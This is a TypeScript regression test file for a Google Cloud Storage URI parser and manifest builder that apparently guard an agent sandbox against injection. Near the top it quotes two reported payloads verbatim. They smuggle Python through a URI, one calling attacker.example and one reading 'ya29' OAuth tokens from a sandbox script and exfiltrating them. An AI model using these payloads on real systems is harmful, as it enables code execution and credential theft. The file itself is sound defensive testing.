/**
 * Regression tests for b/575856796: user-supplied gs:// URIs must never be able
 * to influence code executed in the agent sandbox.
 *
 * Run with: `npm test` (Node >= 22.18 with native type stripping).
 */

import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  GCS_MANIFEST_TARGET,
  buildGcsManifest,
  formatGcsUri,
  buildGcsObjectMediaUrl,
  isBucketAllowed,
  isBucketProxyAllowed,
  parseAllowedBuckets,
  parseGcsUri,
  type GcsManifest,
} from "./gcsSources.ts";

/** Exact payloads from the VRP report (b/575856796), verbatim. */
const CODE_INJECTION_PAYLOAD =
  'gs://b/x"}]\nimport urllib.request; urllib.request.urlopen("http://attacker.example/code-inject-poc")\nfiles=[{"x":"';
const TOKEN_EXFIL_PAYLOAD =
  'gs://b/x"}]\nimport atexit, urllib.request, urllib.parse\ndef _exfil():\n    try:\n        with open("/.agents/download_gcs.py") as _f:\n            for _l in _f:\n                if "ya29" in _l:\n                    urllib.request.urlopen("http://attacker.example/tok?" + urllib.parse.quote(_l.strip()[:200]))\n    except: pass\natexit.register(_exfil)\nfiles=[{"x":"';

function expectRejected(uri: unknown, reason: string): void {
  const result = parseGcsUri(uri);
  assert.equal(result.ok, false, `expected rejection (${reason}) for ${String(uri)}`);
}

function expectAccepted(uri: string): { bucket: string; object: string } {
  const result = parseGcsUri(uri);
  assert.ok(result.ok, `expected acceptance for ${uri}`);
  return result.ref;
}

describe("parseGcsUri", () => {
  it("accepts well-formed URIs", () => {
    assert.deepEqual(expectAccepted("gs://my-bucket/path/to/file.csv"), {
      bucket: "my-bucket",
      object: "path/to/file.csv",
    });
    assert.deepEqual(expectAccepted("  gs://custom.test_bucket-1/a b.csv  "), {
      bucket: "custom.test_bucket-1",
      object: "a b.csv",
    });
  });

  it("accepts object names with quotes and unicode (data, not code)", () => {
    const ref = expectAccepted('gs://super-duper-bucket/q"uote\\d — ünï.csv');
    assert.equal(ref.object, 'q"uote\\d — ünï.csv');
  });

  it("rejects the exact code injection payloads from the VRP report", () => {
    expectRejected(CODE_INJECTION_PAYLOAD, "python code injection");
    expectRejected(TOKEN_EXFIL_PAYLOAD, "token exfiltration");
  });

  it("rejects the VRP payloads even with a valid bucket name", () => {
    // The original payloads also fail the bucket rule ("b" is too short); make
    // sure the object-name guard alone blocks the injection.
    for (const payload of [CODE_INJECTION_PAYLOAD, TOKEN_EXFIL_PAYLOAD]) {
      expectRejected(
        payload.replace("gs://b/", "gs://valid-bucket/"),
        "injection with valid bucket",
      );
    }
  });

  it("rejects non-strings and non-gs schemes", () => {
    expectRejected(undefined, "undefined");
    expectRejected(42, "number");
    expectRejected({ toString: () => "gs://bucket/obj" }, "object");
    expectRejected("https://storage.googleapis.com/bucket/obj", "https");
    expectRejected("GS://bucket/obj", "uppercase scheme");
    expectRejected("gs:/bucket/obj", "malformed scheme");
  });

  it("rejects missing or invalid object names", () => {
    expectRejected("gs://bucket", "no object path");
    expectRejected("gs://bucket/", "empty object");
    expectRejected("gs://bucket/.", "dot object");
    expectRejected("gs://bucket/..", "dot-dot object");
    expectRejected("gs://bucket/line\nbreak.csv", "newline");
    expectRejected("gs://bucket/carriage\rreturn.csv", "carriage return");
    expectRejected("gs://bucket/nul\u0000byte.csv", "NUL");
    expectRejected("gs://bucket/del\u007f.csv", "DEL");
    expectRejected(`gs://bucket/${"a".repeat(1025)}`, "too long");
    expectRejected(`gs://bucket/${"é".repeat(600)}`, "too many UTF-8 bytes");
  });

  it("rejects invalid bucket names", () => {
    expectRejected("gs://Bucket/obj", "uppercase bucket");
    expectRejected("gs://b/obj", "too short");
    expectRejected("gs://-bucket/obj", "leading dash");
    expectRejected("gs://bucket-/obj", "trailing dash");
    expectRejected('gs://buck"et/obj', "quote in bucket");
    expectRejected("gs://bucket name/obj", "space in bucket");
    expectRejected(`gs://${"a".repeat(224)}/obj`, "bucket too long");
  });
});

describe("formatGcsUri / buildGcsObjectMediaUrl", () => {
  it("round-trips a canonical URI", () => {
    const ref = expectAccepted("gs://my-bucket/dir/file.csv");
    assert.equal(formatGcsUri(ref), "gs://my-bucket/dir/file.csv");
  });

  it("fully encodes the object name in the media URL", () => {
    const ref = expectAccepted('gs://my-bucket/dir/sp ace&q"uote.csv');
    assert.equal(
      buildGcsObjectMediaUrl(ref),
      "https://storage.googleapis.com/storage/v1/b/my-bucket/o/dir%2Fsp%20ace%26q%22uote.csv?alt=media",
    );
  });
});

describe("bucket allowlist", () => {
  it("parses a comma separated list, ignoring blanks", () => {
    assert.deepEqual(
      [...parseAllowedBuckets(" sample-data , other-bucket,, ")],
      ["sample-data", "other-bucket"],
    );
    assert.equal(parseAllowedBuckets(undefined).size, 0);
    assert.equal(parseAllowedBuckets("").size, 0);
  });

  it("allows any bucket when no allowlist is configured", () => {
    assert.equal(isBucketAllowed("anything", parseAllowedBuckets(undefined)), true);
  });

  it("restricts buckets when an allowlist is configured", () => {
    const allowed = parseAllowedBuckets("sample-data");
    assert.equal(isBucketAllowed("sample-data", allowed), true);
    assert.equal(isBucketAllowed("ai-studio-bucket-123-us-east1", allowed), false);
  });

  it("never proxies with credentials unless explicitly allowlisted", () => {
    assert.equal(isBucketProxyAllowed("anything", parseAllowedBuckets(undefined)), false);
    assert.equal(isBucketProxyAllowed("sample-data", parseAllowedBuckets("sample-data")), true);
    assert.equal(isBucketProxyAllowed("other", parseAllowedBuckets("sample-data")), false);
  });
});

describe("buildGcsManifest", () => {
  const manifest: GcsManifest = {
    serverUrl: "https://example.test",
    files: [
      {
        bucket: "super-duper-bucket",
        object: 'weird "quoted" \\ name.csv',
        target: "/.agents/data/data.csv",
      },
    ],
  };

  it("is pure JSON that round-trips without loss", () => {
    const serialized = buildGcsManifest(manifest);
    assert.deepEqual(JSON.parse(serialized), manifest);
  });

  it("never contains executable statements or credentials", () => {
    // Belt-and-braces check; the JSON round-trip above is the real guarantee.
    const serialized = buildGcsManifest(manifest);
    assert.doesNotMatch(serialized, /^\s*(import|def|token\s*=)/m);
    assert.doesNotMatch(serialized, /ya29\./);
  });

  it("targets a JSON file, not a Python file, in the sandbox", () => {
    assert.match(GCS_MANIFEST_TARGET, /\.json$/);
    assert.doesNotMatch(GCS_MANIFEST_TARGET, /\.py$/);
  });
});
